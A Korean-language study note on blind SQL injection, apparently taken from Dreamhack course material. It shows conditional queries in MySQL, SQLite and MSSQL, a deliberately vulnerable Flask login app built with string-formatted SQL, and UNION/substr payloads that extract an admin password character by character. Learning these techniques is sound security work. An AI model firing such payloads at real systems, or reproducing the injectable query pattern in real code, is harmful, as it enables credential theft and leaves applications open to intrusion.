SQL Injection - Blind :
    Blind SQL Injection은 데이터베이스 조회 후 결과를 직접적으로 확인할 수 없는 경우 사용될 수 있는 공격 기법입니다.

    Blind SQL Injection 기법의 원리는 DBMS의 함수 또는 연산 과정 등을 이용해 데이터베이스 내에 존재하는 데이터와 사용자 입력을 비교하며, 
    특정한 조건 발생 시 특별한 응답을 발생시켜 해당 비교에 대한 검증을 수행합니다.

    ex)
        답이 7일떄 6이라 말하면 up이란 response가 돌아오고
        8이라 하면 down이라 답이 돌아오면 답이 7인 것을 알 수 있다.

    Blind SQL Injection을 수행하기 위해서는 다음 조건이 만족되어야 합니다.
        1) 데이터를 비교해 참/거짓을 구분
        2) 참/거짓의 결과에 따른 특별한 응답 생성

    데이터를 비교하여 참/거짓을 구분하는 구문으로 If Statements를 많이 사용합니다. 사용 예시는 아래와 같습니다.

    ex)
        # MySQL
        SELECT IF(1=1, True, False);
        /*
        +----------------------+
        | IF(1=1, True, False) |
        +----------------------+
        |                    1 |
        +----------------------+
        1 row in set (0.00 sec)
        */
        
        # SQLite
        SELECT CASE WHEN 1=1 THEN 'true' ELSE 'false' END;
        /*
        true
        */
        
        # MSSQL
        if (SELECT 'test') = 'test' SELECT 1234;
        /*
        Execution time: 0 sec, rows selected: 1, rows affected: 0, absolute service time: 0,17 sec, absolute service time: 0,17 sec
            (No column name)
        1	1234
        */

    참/거짓의 결과에 따른 특별한 응답을 생성하는 방법


Application Logic :
    데이터베이스의 결과를 받은 어플리케이션에서 결과 값에 따라 다른 행위를 수행하게 되는 점을 이용해 참과 거짓을 구분하는 방법입니다.

    아래 코드는 username에 의해 SQL Injection이 발생하며,
    데이터베이스의 결과인 username이 admin인 경우에는 사용자에게 "True"가 반환되고, 아닌 경우에는 "False"가 반환됩니다.

    ex)
        from flask import Flask, request
        import pymysql
        
        app = Flask(__name__)
        
        def getConnection():
            return pymysql.connect(host='localhost', user='dream', password='hack', db='dreamhack', charset='utf8')
        
        @app.route('/' , methods=['GET'])
        def index():
            username = request.args.get('username')
            sql = "select username from users where username='%s'" %username
        
            conn = getConnection()
            curs = conn.cursor(pymysql.cursors.DictCursor)
            curs.execute(sql)
            rows = curs.fetchall()
            conn.close()
            
            if(rows[0]['username'] == "admin"):
                return "True"
            else:
                return "False"
        
        app.run(host='0.0.0.0', port=8000)

    데이터베이스에 아래와 같이 데이터가 있는 경우를 가정하고 설명하도록 하겠습니다.
    ex)
        mysql> select * from users;
        +----------+------------------------+
        | username | password               |
        +----------+------------------------+
        | admin    | Password_for_admin     |
        | guest    | guest_Password         |
        +----------+------------------------+
        2 rows in set (0.00 sec)
    
    1) UNION 구문을 이용해 "admin" 반환
        /?username=' union select 'admin' -- -
        ==> True
        /?username=' union select 'not admin' -- -
        ==> False

        데이터베이스에서 반환된 결과가 "admin"인 경우 사용자에게 "True"가 반환되며, 아닌 경우에는 "False"가 반환되는 것을 확인할 수 있습니다.

    2) IF Statements 및 비교 구문 추가
        /?username=' union select if(substr(password,1,1)='A', 'admin', 'not admin') from users where username='admin' -- -
        ==> False
        
        /?username=' union select if(substr(password,1,1)='B', 'admin', 'not admin') from users where username='admin' -- -
        ==> False
        
        ...
        
        /?username=' union select if(substr(password,1,1)='P', 'admin', 'not admin') from users where username='admin' -- -
        ==> True
        
        ...
        
        /?username=' union select if(substr(password,2,1)='a', 'admin', 'not admin') from users where username='admin' -- -
        ==> True

    substr은 첫번째 인자의 문자열을 두번째 인자의 index부터 세번째 인자의 길이만큼 반환하는 함수입니다.

    즉, substr(password,1,1) 실행 시 "admin"의 패스워드 첫번째 문자열인 "P"가 반환되며, 사용자는 각 문자열을 입력하며 비교합니다.

    사용자 입력 문자 중 "P"문자 입력 시 조건이 참이되며, 사용자에게 "True"가 출력되어집니다.
    이를 통해 사용자는 password의 첫번째 문자열이 "P"임을 알 수 있습니다.

    위와 같은 방법으로 index를 변경하며 password 전체를 획득할 수 있습니다.

        select if (조건, 참, 거짓) ..
        조건이 참일떄 참 return, 거짓일떄 거짓 return

        즉 위 코드는 조건이 true일떄 'admin' 값 return 하는데 'admin'의 값은 true다.

            /?username=' union select 'admin' -- -
            ==> True













